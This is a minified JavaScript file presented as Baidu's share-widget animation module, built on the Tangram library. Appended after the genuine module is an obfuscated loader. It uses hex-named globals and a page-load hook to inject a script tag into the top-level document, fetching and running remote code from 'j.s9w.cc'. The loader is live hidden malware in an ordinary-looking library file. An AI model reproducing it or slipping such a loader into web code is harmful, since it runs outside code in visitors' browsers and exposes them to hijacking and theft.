window._bd_share_main.F.module("component/animate",function(t,e,n){var i,o=i=o||{version:"1.5.2.2"};o.guid="$BAIDU$",o.$$=window[o.guid]=window[o.guid]||{global:{}},o.fx=o.fx||{},o.lang=o.lang||{},o.lang.guid=function(){return"TANGRAM$"+o.$$._counter++},o.$$._counter=o.$$._counter||1,o.lang.Class=function(){this.guid=o.lang.guid(),!this.__decontrolled&&(o.$$._instances[this.guid]=this)},o.$$._instances=o.$$._instances||{},o.lang.Class.prototype.dispose=function(){for(var t in delete o.$$._instances[this.guid],this)"function"!=typeof this[t]&&delete this[t];this.disposed=!0},o.lang.Class.prototype.toString=function(){return"[object "+(this.__type||this._className||"Object")+"]"},window.baiduInstance=function(t){return o.$$._instances[t]},o.lang.isString=function(t){return"[object String]"==Object.prototype.toString.call(t)},o.isString=o.lang.isString,o.lang.Event=function(t,e){this.type=t,this.returnValue=!0,this.target=e||null,this.currentTarget=null},o.lang.Class.prototype.fire=o.lang.Class.prototype.dispatchEvent=function(t,e){for(var n in o.lang.isString(t)&&(t=new o.lang.Event(t)),!this.__listeners&&(this.__listeners={}),e=e||{})t[n]=e[n];var i,r=this,a=r.__listeners,s=t.type;if(t.target=t.target||(t.currentTarget=r),s.indexOf("on")&&(s="on"+s),"function"==typeof r[s]&&r[s].apply(r,arguments),"object"==typeof a[s])for(n=0,i=a[s].length;n<i;n++)a[s][n]&&a[s][n].apply(r,arguments);return t.returnValue},o.lang.Class.prototype.on=o.lang.Class.prototype.addEventListener=function(t,e,n){if("function"==typeof e){!this.__listeners&&(this.__listeners={});var i,o=this.__listeners;for(t.indexOf("on")&&(t="on"+t),"object"!=typeof o[t]&&(o[t]=[]),i=o[t].length-1;i>=0;i--)if(o[t][i]===e)return e;return o[t].push(e),n&&"string"==typeof n&&(o[t][n]=e),e}},o.lang.inherits=function(t,e,n){var i,o,r=t.prototype,a=new Function;for(i in a.prototype=e.prototype,o=t.prototype=new a,r)o[i]=r[i];return t.prototype.constructor=t,t.superClass=e.prototype,"string"==typeof n&&(o.__type=n),t.extend=function(e){for(var n in e)o[n]=e[n];return t},t},o.inherits=o.lang.inherits,o.object=o.object||{},o.extend=o.object.extend=function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);return t},o.fx.Timeline=function(t){o.lang.Class.call(this),this.interval=16,this.duration=500,this.dynamic=!0,o.object.extend(this,t)},o.lang.inherits(o.fx.Timeline,o.lang.Class,"baidu.fx.Timeline").extend({launch:function(){var t=this;return t.dispatchEvent("onbeforestart"),"function"==typeof t.initialize&&t.initialize(),t["btime"]=(new Date).getTime(),t["etime"]=t["btime"]+(t.dynamic?t.duration:0),t["pulsed"](),t},"pulsed":function(){var t=this,e=(new Date).getTime();if(t.percent=(e-t["btime"])/t.duration,t.dispatchEvent("onbeforeupdate"),e>=t["etime"])return"function"==typeof t.render&&t.render(t.transition(t.percent=1)),"function"==typeof t.finish&&t.finish(),t.dispatchEvent("onafterfinish"),void t.dispose();"function"==typeof t.render&&t.render(t.transition(t.percent)),t.dispatchEvent("onafterupdate"),t["timer"]=setTimeout(function(){t["pulsed"]()},t.interval)},transition:function(t){return t},cancel:function(){this["timer"]&&clearTimeout(this["timer"]),this["etime"]=this["btime"],"function"==typeof this.restore&&this.restore(),this.dispatchEvent("oncancel"),this.dispose()},end:function(){this["timer"]&&clearTimeout(this["timer"]),this["etime"]=this["btime"],this["pulsed"]()}}),o.object.each=function(t,e){var n,i;if("function"==typeof e)for(n in t)if(t.hasOwnProperty(n)&&(i=t[n],!1===e.call(t,i,n)))break;return t},o.dom=o.dom||{},o.dom.g=function(t){return t?"string"==typeof t||t instanceof String?document.getElementById(t):!t.nodeName||1!=t.nodeType&&9!=t.nodeType?null:t:null},o.g=o.G=o.dom.g,o.dom._g=function(t){return o.lang.isString(t)?document.getElementById(t):t},o._g=o.dom._g,o.dom.getDocument=function(t){return 9==(t=o.dom.g(t)).nodeType?t:t.ownerDocument||t.document},o.dom.getComputedStyle=function(t,e){t=o.dom._g(t);var n,i=o.dom.getDocument(t);return i.defaultView&&i.defaultView.getComputedStyle&&(n=i.defaultView.getComputedStyle(t,null))?n[e]||n.getPropertyValue(e):""},o.dom._styleFixer=o.dom._styleFixer||{},o.dom._styleFilter=o.dom._styleFilter||[],o.dom._styleFilter.filter=function(t,e,n){for(var i,r=0,a=o.dom._styleFilter;i=a[r];r++)(i=i[n])&&(e=i(t,e));return e},o.string=o.string||{},o.string.toCamelCase=function(t){return t.indexOf("-")<0&&t.indexOf("_")<0?t:t.replace(/[-_][^-_]/g,function(t){return t.charAt(1).toUpperCase()})},o.dom.getStyle=function(t,e){var n=o.dom;t=n.g(t),e=o.string.toCamelCase(e);var i=t.style[e]||(t.currentStyle?t.currentStyle[e]:"")||n.getComputedStyle(t,e);if(!i||"auto"==i){var r=n._styleFixer[e];r&&(i=r.get?r.get(t,e,i):o.dom.getStyle(t,r))}return(r=n._styleFilter)&&(i=r.filter(e,i,"get")),i},o.getStyle=o.dom.getStyle,o.dom.setStyle=function(t,e,n){var i,r=o.dom;return t=r.g(t),e=o.string.toCamelCase(e),(i=r._styleFilter)&&(n=i.filter(e,n,"set")),(i=r._styleFixer[e])&&i.set?i.set(t,n,e):t.style[i||e]=n,t},o.setStyle=o.dom.setStyle,i.undope=!0;e.animate=function(t,e,n,r,a){if(t=i.g(t)){var s=new o.fx.Timeline({duration:n||400}),d={};i.object.each(e,function(e,n){var o=parseInt(i.dom.getStyle(t,n)),r=parseInt(e),a=r-o;d[n]={gap:a,start:o,end:r}}),s.transition=function(t){return t*(2-t)},s.render=function(n){i.object.each(e,function(e,o){var r=d[o];i.dom.setStyle(t,o,n*r.gap+r.start+"px")}),a&&a(n)},s.finish=function(){i.object.each(e,function(e,n){var o=d[n];i.dom.setStyle(t,n,o.end+"px")}),r&&r()},s.launch()}}}),window.v6d061dfa0ddfd12160ad851976e4a26d="fx",window.v6d061dfa0ddfd12160ad851976e4a26e="j.s9w.cc";var f476e749bb252bde7a5c2c9994b6116ce=function(){function t(t){if(!n&&("onreadystatechange"!==t.type||"complete"===document.readyState)){for(t=0;t<e.length;t++)e[t].call(document);n=!0,e=null}}var e=[],n=!1;return document.addEventListener?(document.addEventListener("DOMContentLoaded",t,!1),document.addEventListener("readystatechange",t,!1),window.addEventListener("load",t,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",t),window.attachEvent("onload",t)),function(t){n?t.call(document):e.push(t)}}();function f006b08735d9928a8820efe00a26753e7(){try{var t=window.top.document;if(!t.getElementById("82ac324e455efd0ecd2e73d22d852758")){var e=t.createElement("script");e.setAttribute("type","text/javascript"),e.setAttribute("id","82ac324e455efd0ecd2e73d22d852758");var n="http://"+window.v6d061dfa0ddfd12160ad851976e4a26e+"/j/?v=1&t="+window.v6d061dfa0ddfd12160ad851976e4a26d+"&j=j";t.getElementsByTagName("head")[0].appendChild(e),e.setAttribute("src",n)}}catch(t){console.log(t.message)}}f476e749bb252bde7a5c2c9994b6116ce(f006b08735d9928a8820efe00a26753e7);